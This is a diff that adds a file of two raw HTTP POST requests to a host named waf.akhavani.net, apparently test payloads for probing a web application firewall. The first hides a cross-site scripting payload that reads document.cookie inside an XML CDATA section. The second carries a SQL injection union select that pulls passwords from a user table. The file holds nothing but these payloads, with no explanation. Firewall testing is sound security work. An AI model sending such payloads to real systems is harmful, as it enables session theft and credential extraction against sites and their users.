@@ -1,0 +1,20 @@
+POST / HTTP/1.1
+Host: waf.akhavani.net
+Content-Type: application/xml
+Content-Length: 109
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<field1><![CDATA[<script>alert(document.cookie)</script>]]></field1>
+
+
+
+####
+####
+####
+
+POST / HTTP/1.1
+Host: waf.akhavani.net
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<field1>0 union select 'password is: ' || password from user limi 1 -- -</field1>
